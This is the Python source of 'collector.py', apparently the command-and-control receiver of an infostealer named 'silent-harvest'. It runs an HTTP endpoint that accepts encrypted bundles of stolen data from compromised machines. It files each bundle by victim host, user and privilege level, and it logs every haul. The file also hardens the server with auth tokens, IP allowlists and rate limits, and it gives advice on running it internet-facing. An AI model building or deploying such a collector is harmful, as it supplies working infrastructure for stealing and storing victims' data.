"""silent-harvest collector — hardened loot receiver.

Usage:
    python collector.py [--port 8443] [--bind 0.0.0.0] [--psk SECRET]
                        [--auth TOKEN] [--allow 10.0.0.0/8,192.168.1.0/24]
                        [--max-body 128] [--rate 60] [--loot-dir ../loot]

Controls:
    --auth TOKEN   require header X-SH-Auth: TOKEN on every request
                   (compared in constant time; rejected before any reading)
    --allow LIST   comma-separated CIDRs / IPs allowed to connect
                   (default: any -- restrict this on an internet-facing host)
    --max-body MB  request body cap, default 128
    --rate N       max requests per source IP per minute, default 60
    --psk          pre-shared key (arg > env SH_PSK > psk.txt > dev key).
                   psk.txt is chmod 0600 on POSIX.

Endpoints:
    POST /gate   body = SHV1 container; stored under loot/<host>-<user>-<ts>/
    GET  /health liveness (also requires --auth when set)

Everything about the victim travels inside the encrypted container; the only
plaintext on the wire is the 6-byte header (magic+version). Access decisions
are logged to <loot-dir>/access.log.
"""
import argparse
import hmac
import ipaddress
import json
import os
import re
import sys
import threading
import time
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer

import shcrypto

LOCK = threading.Lock()
RATE_LOCK = threading.Lock()
RATE = {}  # ip -> (window_start, count)


def rate_limited(ip, limit):
    now = time.time()
    with RATE_LOCK:
        start, count = RATE.get(ip, (now, 0))
        if now - start > 60:
            RATE[ip] = (now, 1)
            return False
        RATE[ip] = (start, count + 1)
        return count + 1 > limit


def ip_allowed(ip, networks):
    if not networks:
        return True
    try:
        addr = ipaddress.ip_address(ip)
    except ValueError:
        return False
    return any(addr in net for net in networks)


class Handler(BaseHTTPRequestHandler):
    protocol_version = "HTTP/1.1"
    timeout = 60  # dead/slow connections get dropped
    loot_dir = "loot"
    auth_token = None
    allow_nets = None
    max_body = 128 * 1024 * 1024
    rate_limit = 60
    access_log = None

    def log_message(self, fmt, *args):
        pass  # we do our own structured access logging

    def _access(self, verdict, extra=""):
        if self.access_log is None:
            return
        with LOCK:
            with open(self.access_log, "a") as f:
                f.write("%s %s %s %s %s %s\n" % (
                    time.strftime("%Y-%m-%dT%H:%M:%S"),
                    self.client_address[0], self.command, self.path,
                    verdict, extra))

    def _reply(self, code, body=b"ok\n"):
        self.send_response(code)
        self.send_header("Content-Type", "text/plain")
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)

    # ---------------------------------------------------------- gatekeeping
    def _preflight(self):
        ip = self.client_address[0]
        if not ip_allowed(ip, self.allow_nets):
            self._access("DENY_SOURCE")
            self._reply(403, b"forbidden\n")
            return False
        if rate_limited(ip, self.rate_limit):
            self._access("RATE_LIMIT")
            self._reply(429, b"slow down\n")
            return False
        if self.auth_token is not None:
            supplied = self.headers.get("X-SH-Auth", "")
            if not hmac.compare_digest(supplied, self.auth_token):
                self._access("DENY_AUTH")
                self._reply(401, b"unauthorized\n")
                return False
        return True

    # ---------------------------------------------------------- handlers
    def do_GET(self):
        if not self._preflight():
            return
        if self.path in ("/health", "/"):
            self._access("OK")
            self._reply(200, b"silent-harvest collector up\n")
        else:
            self._access("404")
            self._reply(404, b"nope\n")

    def do_POST(self):
        if not self._preflight():
            return
        if self.path != "/gate":
            self._access("404")
            self._reply(404, b"nope\n")
            return
        try:
            length = int(self.headers.get("Content-Length", "0"))
        except ValueError:
            length = -1
        if length <= 0 or length > self.max_body:
            self._access("BAD_LENGTH", "len=%s" % self.headers.get("Content-Length"))
            self._reply(400, b"bad length\n")
            return
        blob = self.rfile.read(length)
        if len(blob) != length:
            self._access("TRUNCATED")
            self._reply(400, b"short body\n")
            return
        try:
            manifest, parts = shcrypto.unpack(blob, self.server.psk)
        except ValueError as e:
            print("[%s] REJECTED bundle: %s" % (time.strftime("%H:%M:%S"), e))
            self._access("REJECT_BUNDLE", str(e))
            self._reply(400, b"bad bundle\n")
            return

        v = manifest.get("victim", {})
        vid = "%s-%s-%d" % (
            re.sub(r"[^A-Za-z0-9_.-]", "_", str(v.get("host", "unknown"))),
            re.sub(r"[^A-Za-z0-9_.-]", "_", str(v.get("user", "unknown"))),
            int(v.get("ts", time.time())),
        )
        dest = os.path.join(self.loot_dir, vid)
        with LOCK:
            os.makedirs(os.path.join(dest, "parts"), exist_ok=True)
            with open(os.path.join(dest, "bundle.bin"), "wb") as f:
                f.write(blob)
            with open(os.path.join(dest, "manifest.json"), "w") as f:
                json.dump(manifest, f, indent=2)
            for name, data in parts.items():
                safe = re.sub(r"[^A-Za-z0-9_.()-]", "_", name)
                with open(os.path.join(dest, "parts", safe), "wb") as f:
                    f.write(data)
            with open(os.path.join(self.loot_dir, "index.jsonl"), "a") as f:
                f.write(json.dumps({
                    "id": vid, "ts": v.get("ts"),
                    "host": v.get("host"), "user": v.get("user"),
                    "elevated": v.get("elevated"),
                    "parts": [{"name": p["name"], "len": p["len"]}
                              for p in manifest["parts"]],
                }) + "\n")

        print("[%s] LOOT %s  host=%s user=%s elevated=%s  parts=%d  (%d bytes)"
              % (time.strftime("%H:%M:%S"), vid, v.get("host"), v.get("user"),
                 v.get("elevated"), len(parts), len(blob)))
        for p in manifest["parts"]:
            print("    - %-46s %10d bytes  %s"
                  % (p["name"], p["len"], json.dumps(p.get("meta", {}))))
        sys.stdout.flush()
        self._access("ACCEPT", "id=%s bytes=%d" % (vid, len(blob)))
        self._reply(200, b"ok\n")


class Server(ThreadingHTTPServer):
    daemon_threads = True
    request_queue_size = 32


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--port", type=int, default=8443)
    ap.add_argument("--bind", default="0.0.0.0")
    ap.add_argument("--psk", default=None)
    ap.add_argument("--auth", default=os.environ.get("SH_AUTH"),
                    help="require X-SH-Auth header with this token")
    ap.add_argument("--allow", default=None,
                    help="comma-separated CIDRs/IPs allowed to connect")
    ap.add_argument("--max-body", type=int, default=128,
                    help="max request body in MB (default 128)")
    ap.add_argument("--rate", type=int, default=60,
                    help="max requests per IP per minute (default 60)")
    ap.add_argument("--loot-dir", default=os.path.join(
        os.path.dirname(os.path.abspath(__file__)), "..", "loot"))
    args = ap.parse_args()

    psk = shcrypto.get_psk(args.psk)
    Handler.loot_dir = os.path.abspath(args.loot_dir)
    os.makedirs(Handler.loot_dir, exist_ok=True)

    Handler.auth_token = args.auth
    Handler.max_body = args.max_body * 1024 * 1024
    Handler.rate_limit = args.rate
    Handler.access_log = os.path.join(Handler.loot_dir, "access.log")
    if args.allow:
        nets = []
        for c in args.allow.split(","):
            c = c.strip()
            if not c:
                continue
            try:
                nets.append(ipaddress.ip_network(c, strict=False))
            except ValueError:
                sys.exit("bad CIDR in --allow: %s" % c)
        Handler.allow_nets = nets

    # tighten the psk file on POSIX (no-op on Windows)
    if os.name == "posix":
        psk_file = os.path.join(os.path.dirname(os.path.abspath(__file__)), "psk.txt")
        if os.path.exists(psk_file):
            os.chmod(psk_file, 0o600)

    srv = Server((args.bind, args.port), Handler)
    srv.psk = psk
    print("silent-harvest collector on %s:%d  loot -> %s" %
          (args.bind, args.port, Handler.loot_dir))
    print("auth: %s  allowlist: %s  max-body: %dMB  rate: %d/min" % (
        "X-SH-Auth REQUIRED" if args.auth else "NONE (set --auth!)",
        args.allow or "any (set --allow!)", args.max_body, args.rate))
    print("PSK: %s" % ("(explicit arg)" if args.psk
                       else "env SH_PSK / psk.txt / default dev key"))
    if not args.auth or not args.allow:
        print("WARN: running without --auth / --allow is fine on a lab box "
              "only; internet-facing collectors need both")
    try:
        srv.serve_forever()
    except KeyboardInterrupt:
        pass


if __name__ == "__main__":
    main()
